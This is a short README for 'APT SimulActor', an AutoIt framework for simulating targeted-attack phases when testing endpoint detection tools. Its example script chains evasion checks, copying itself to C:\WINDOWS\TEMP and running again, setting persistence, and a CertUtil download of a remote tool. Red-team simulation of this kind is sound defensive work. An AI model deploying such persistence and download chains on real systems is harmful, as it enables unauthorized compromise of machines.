# APT SimulActor

## Introduction

Targeted attacks are not random in nature and are usually composed of different phases like infection, data exfiltration and persistency.
APT SimulActor is a little framework based on AutoIT libraries for basic EDR POCs.

## Example Code
```
#include <APT-SimulActor.au3>

init()

if InternetCheck() Then

   If numberOfLogins(whoami()) > 2 Then

	  if isRunningFromFolder("C:\WINDOWS\TEMP") Then

		 SetPersistent4CurrentUser()

		 CertUtilDownloader($PSTools_URL)

	  Else

		 MoveAndRunAgain("C:\WINDOWS\TEMP")

	  EndIf

   EndIf

EndIf

```



## Prerequisites

AutoIt Downloads [link](https://www.autoitscript.com/site/autoit/downloads/)

## Disclaimer

The APT-SimulActor use requires authorization from proper stakeholders. Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.
